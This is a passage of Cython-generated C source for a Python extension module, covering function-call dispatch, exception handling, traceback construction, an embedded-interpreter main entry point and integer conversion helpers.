                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* PyObjectSetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
